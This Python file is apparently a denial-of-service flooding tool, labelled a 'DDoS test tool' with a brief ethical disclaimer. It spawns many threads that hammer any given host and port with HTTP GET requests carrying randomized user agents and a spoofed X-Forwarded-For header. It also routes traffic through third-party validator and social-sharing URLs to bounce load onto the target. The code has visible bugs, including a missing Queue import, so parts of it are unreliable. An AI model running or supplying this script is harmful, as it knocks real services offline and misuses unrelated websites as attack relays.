from fake_useragent import UserAgent
import urllib.request
import socket
import threading
import random
import time
import sys
import pyfiglet

if len(sys.argv) != 4:
    print("""
    DDoS test tool:
    - Use for ethical
    - Don't attack others

    Usage : python main.py <hostname> <port> <threads>
    """)
    sys.exit(1)

ip = sys.argv[1]
host = socket.gethostbyname(ip)
port = int(sys.argv[2])
thr = int(sys.argv[3])
proxy_ip = '10.181.12.14'

def user_agent_list():
    return [UserAgent().random for i in range(20)]

def bot_links():
    return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
            ]

def bot_hammering(url, user_agents):
    while True:
        try:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agents)}))
            print("Bot hammering...")
            time.sleep(.1)
        except urllib.request.URLError as error:
            print("URLLIB ERROR:",error)
            time.sleep(.1)


def down_it(item, host, port, user_agents):
    while True:
        try:
            packet = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"X-Forwarded-For: {proxy_ip}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                    ).encode('ascii')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
            s.connect((host,port))
            if s.sendto(packet, (host,port)):
                s.shutdown(1)
                print(f"[{time.ctime(time.time())}] <-- packet sent rippering -->")
            else:
                s.shutdown(1)
                print("Shutdown")
        except socket.error as error:
            print("Error:",error)

def dos(q, host, port, user_agents):
    item = q.get()
    down_it(item, host, port, user_agents)
    q.task_done()

def dos2(w, host, user_agents):
    item = w.get()
    bot_hammering(random.choice(bots) + f"http://{host}", random.choice(user_agents))
    w.task_done()

q = Queue()
w = Queue()

if __name__ == "__main__":
    bots = bot_links()
    user_agents = user_agent_list()
    banner = pyfiglet.figlet_format("DDoS\nTest tool")
    print(banner)
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s.settimeout(2)
        s.connect((host,port))
    except socket.error as error:
        print("Error:",error)

    while True:
        for i in range(thr):
            thread = threading.Thread(target=dos, args=(q, host, port, user_agents))
            thread.daemon = True
            thread.start()
            thread2 = threading.Thread(target=dos2, args=(w, host, user_agents))
            thread2.daemon = True
            thread2.start()
        start = time.time()
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(.1)
            item += 1
            q.put(item)
            w.put(item)
        q.join()
    w.join()
